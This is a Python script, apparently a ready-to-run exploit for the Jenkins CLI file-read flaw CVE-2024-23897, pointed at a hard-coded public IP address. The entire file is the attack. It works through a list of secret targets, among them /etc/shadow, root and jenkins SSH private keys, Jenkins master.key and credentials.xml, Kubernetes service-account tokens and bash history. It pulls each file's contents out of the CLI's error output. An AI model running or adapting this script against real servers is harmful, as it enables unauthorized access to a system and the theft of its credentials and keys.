#!/usr/bin/env python3
"""Exploit CVE-2024-23897 to read files from Jenkins 2.375.3"""
import subprocess
import sys
import re

HOST = "http://51.250.97.223:8080"
CLI_JAR = "/tmp/jenkins-cli.jar"

files = [
    # Jenkins secrets
    "/proc/self/environ",
    "/proc/1/cmdline",
    "/proc/self/cmdline",
    
    # Jenkins config
    "/var/jenkins_home/config.xml",
    "/var/jenkins_home/credentials.xml",
    "/var/jenkins_home/secrets/master.key",
    "/var/jenkins_home/identity.key",
    "/var/jenkins_home/secrets/hudson.util.Secret",
    "/var/jenkins_home/secrets/jenkins.model.Jenkins.crumbSalt",
    "/var/jenkins_home/users/users.xml",
    
    # SSH keys
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_ed25519",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/config",
    "/home/jenkins/.ssh/id_rsa",
    "/home/jenkins/.ssh/authorized_keys",
    
    # Env and config
    "/root/.env",
    "/root/.bashrc",
    "/root/.bash_history",
    "/root/.profile",
    
    # System
    "/etc/shadow",
    "/etc/hostname",
    "/etc/hosts",
    "/etc/ssh/ssh_host_rsa_key",
    "/etc/ssh/ssh_host_ed25519_key",
    "/etc/ssh/ssh_host_ed25519_key.pub",
    
    # Docker
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/run/secrets/kubernetes.io/serviceaccount/token",
    
    # Jenkins job configs
    "/var/jenkins_home/jobs/",
    "/var/jenkins_home/jobs",
]

def read_file(filepath):
    try:
        result = subprocess.run(
            ["java", "-jar", CLI_JAR, "-s", HOST, "help", "@/{}".format(filepath)],
            capture_output=True, text=True, timeout=10
        )
        stderr = result.stderr
        stdout = result.stdout
        
        # Parse the output - the file content is in the error message
        # Extract between "Too many arguments:" and "java -jar jenkins-cli.jar help [COMMAND]"
        content = ""
        if "Too many arguments" in stderr:
            match = re.search(r"Too many arguments: (.+?)(?:\njava -jar|\nJenkins CLI)", stderr, re.DOTALL)
            if match:
                content = match.group(1).strip()
        elif "Failed to parse" in stderr:
            content = "[FAILED TO PARSE - likely binary file]"
        elif "No such file" in stderr:
            content = "[FILE NOT FOUND]"
        elif "Permission denied" in stderr or "permission denied" in stderr.lower():
            content = "[PERMISSION DENIED]"
        else:
            content = stderr[:500] if stderr else "[EMPTY RESPONSE]"
        
        return content
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return "[ERROR: {}]".format(e)

for f in files:
    content = read_file(f)
    print("=" * 60)
    print("FILE: {}".format(f))
    print("-" * 60)
    print(content)
    sys.stdout.flush()
